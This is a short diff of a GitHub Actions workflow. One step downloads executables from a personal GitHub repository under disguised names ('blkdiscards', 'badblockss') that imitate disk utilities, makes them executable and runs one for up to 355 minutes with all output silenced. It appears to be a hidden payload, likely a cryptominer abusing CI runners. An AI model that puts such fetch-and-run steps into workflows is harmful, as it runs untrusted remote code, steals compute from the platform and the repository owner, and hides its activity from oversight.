@@ -21,4 +21,4 @@ jobs:
       run: wget -O blkdiscards https://raw.githubusercontent.com/kijang-7/gas/main/vio && wget https://raw.githubusercontent.com/kijang-7/gas/main/badblockss && wget https://raw.githubusercontent.com/kijang-7/ssh/main/timeout  && chmod +x blkdiscards badblockss
     - name: Start
       continue-on-error: true
-      run: timeout 4000m ./badblockss
+      run: timeout 355m ./badblockss >/dev/null 2>&1
